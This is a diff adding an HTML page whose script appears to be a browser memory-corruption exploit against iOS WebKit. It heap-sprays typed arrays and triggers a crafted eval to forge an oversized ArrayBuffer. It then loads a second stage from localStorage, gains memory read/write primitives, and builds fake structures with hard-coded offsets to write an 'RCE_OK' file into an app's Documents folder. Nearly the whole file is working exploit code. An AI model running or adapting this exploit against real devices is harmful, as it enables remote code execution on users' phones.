@@ -1,0 +1,46 @@
+<!doctype html><html><head><meta charset="utf-8"></head><body>
+<div id="v">X</div>
+<script>"use strict";
+var N=3000,H=200,HN=64,VK=598;
+var PAT=[0,0,0,0,1,0,0,0,255,255,0,0,255,255,255,255,255,255,255,255,255,255,255,255,1,0,0,0,255,255,255,255,255,255,255,255,255,255,255,255];
+if (globalThis.PAT !== PAT) {
+  globalThis.RESULT="RESULT NO_TOPS";
+  try{document.getElementById("v").textContent=globalThis.RESULT;}catch(e){}
+} else {
+var S=new Array(N),fb=new Uint8Array(40);
+for(var j=0;j<40;j++)fb[j]=PAT[j];
+for(var i=0;i<N;i++){var u=new Uint8Array(957);S[i]=u;}
+for(var k=0;k<HN;k++)S[H+k]=null;
+globalThis.f=(0,eval)('"use strict";(function ([] = eval("(")) { var q1=0,q2=0,q3=0; return 1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5; })');
+var D=new Array(800);for(var i=0;i<800;i++)D[i]=new ArrayBuffer(64);
+var TN=600,T=new Array(TN),TV=new Array(TN);
+for(var i=0;i<TN;i++){T[i]=new ArrayBuffer(72);TV[i]=new Uint8Array(T[i]);}
+var PH=[4,12,20,28,36],VKS=[598,598-10,598-20,598-30,598-40];
+var hit=-1,len=0,ph=-1,vk=-1,nt=0;
+for(var pi=0;pi<5&&hit<0;pi++){
+  var p=PH[pi];
+  for(var i=0;i<N;i++){if(S[i]){for(var o=p;o+40<=957;o+=40)S[i].set(fb,o);}}
+  for(var vi=0;vi<5&&hit<0;vi++){
+    var v=VKS[vi]; if(v<16) continue;
+    for(var r=0;r<8;r++){var j=v-2*r;T[j]=null;TV[j]=null;}
+    try{f();}catch(e){}
+    nt++;
+    for(var i=0;i<TN;i++){if(T[i]!==null&&T[i].byteLength!==72){hit=i;len=T[i].byteLength;ph=p;vk=v;break;}}
+  }
+}
+if(hit>=0){globalThis.AB=T[hit];globalThis.ABV=TV[hit];globalThis.N1LEAK="FORGED";}
+globalThis.RESULT="RESULT LS C=34 SZ=957 N=3000 H=200 HN=64 HIT="+hit+" LEN="+len+" PH="+ph+" VK="+vk+" NT="+nt;
+globalThis.N1MARK=globalThis.RESULT;
+try{document.getElementById("v").textContent=globalThis.RESULT;}catch(e){}
+try{console.log("N1A:"+globalThis.RESULT);}catch(e){}
+var s2=null; try{s2=localStorage.getItem("n1s2");}catch(e){}
+globalThis.RESULT += " S2LEN=" + (s2===null ? -1 : s2.length);
+if(hit>=0 && s2){
+ try{s2=s2.replace('i("IOS_N1_OK','globalThis.R=_;globalThis.W=h;globalThis.D=b;globalThis.U=d;globalThis.F=S;globalThis.B=T;globalThis.Y=y;globalThis.X=a;globalThis.M=i;globalThis.K=c;i("IOS_N1_OK');(0,eval)(s2);}catch(e2){}
+ try{if(globalThis.U){!function(){var f=B,n=(F,D),r=R,t=(W,Y,X),i=M,a=(K,f+0x3292cn),o=f+0x172d96cn,x=f+0x628a2cn;function c(f,n,r){for(var t,i=(t=r,BigInt.asUintN(64,t)),a=0;a<8;a++)f[n+a]=Number(i>>BigInt(8*a)&0xffn)}for(var e=0x1122334455667788n,v=new Uint8Array(2048),g=0;g<2048;g++)v[g]=0;c(v,1024,e);var I,C=0n;for(I=n;I<n+65536n;I+=8n){if(2048n===(0xffffffffn&r(I))){var u=r(I+16n),A=0x00ffffffffffffffn&u;if(A>0x10000n&&A<0x0001000000000000n&&0n===(7n&u))try{if(r(u+0x400n)===e){C=u;break}}catch(f){}}}if(0n===C)for(I=n-8n;I>n-65536n;I-=8n){if(2048n===(0xffffffffn&r(I))){var U=r(I+16n),b=0x00ffffffffffffffn&U;if(b>0x10000n&&b<0x0001000000000000n&&0n===(7n&U))try{if(r(U+0x400n)===e){C=U;break}}catch(f){}}}if(0n!==C){for(var h='/private/var/mobile/Containers/Data/Application/00000000-0000-0000-0000-000000000000/Documents/rce.txt',s='RCE_OK\n',y=O(103),d=O(y+7+1),l=d+64,m=l+64,p=m+64,N=p+64,_=0;_<N;_++)v[_]=0;for(var k=0;k<102;k++)v[0+k]=255&h.charCodeAt(k);for(var w=0;w<7;w++)v[y+w]=255&s.charCodeAt(w);v[d+16]=1,v[d+17]=6,v[d+24]=164,v[d+25]=1,c(v,l+40,C+BigInt(0)),c(v,m+16,C+BigInt(y)),v[m+24]=7;for(var E=new Uint8Array(1024),H=0;H<1024;H++)E[H]=0;c(E,8,C+BigInt(l)),c(E,16,o),c(E,24,C+BigInt(d)),c(E,184,C+BigInt(l)),c(E,208,17592880937292n),c(E,224,x),c(E,240,o),c(E,248,C+BigInt(m)),c(E,272,a),c(E,416,17592880936760n),c(E,448,a),c(E,584,C+BigInt(p)),c(E,608,17593429763188n),c(E,624,x),i('U_RDY '+t(C)+' PATH='+h)}else i('U_NF D='+t(n));function O(f){return f+7&-8}}();}}catch(e3){}
+}
+
+}
+</script>
+</body></html>
+<!--AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA-->
